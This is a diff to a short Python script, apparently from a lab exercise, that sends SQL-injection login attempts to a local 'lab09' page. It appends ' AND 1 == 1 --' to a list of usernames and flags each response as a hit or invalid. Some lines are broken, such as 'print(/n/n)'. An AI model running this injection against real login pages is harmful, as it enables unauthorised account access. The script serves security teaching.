@@ -9,12 +9,11 @@ def send_request(params, url):
     url = url + "?" + query
 
     with urlr.urlopen(url) as response:
-        response_text = response.read(400)
-        print(response_text)
+        return response.read(400)
 
 
 def inject_bypass(user):
-    user = user + " AND 1 == 1 --"
+    return user + " AND 1 == 1 --"
 
 
 usernames = {
@@ -50,11 +49,18 @@ usernames = {
 url = "http://localhost/lab09/login.php"
 
 for username in usernames:
-    inject_bypass(username)
+    print(username)
+    username = inject_bypass(username)
 
     params = {
         "u": username,
         "p": ""
     }
 
-    send_request(params, url)
+    response = send_request(params, url)
+    if("invalid" in response):
+        print("/tinvalid!")
+    else:
+        print("/thit!")
+
+    print(/n/n)
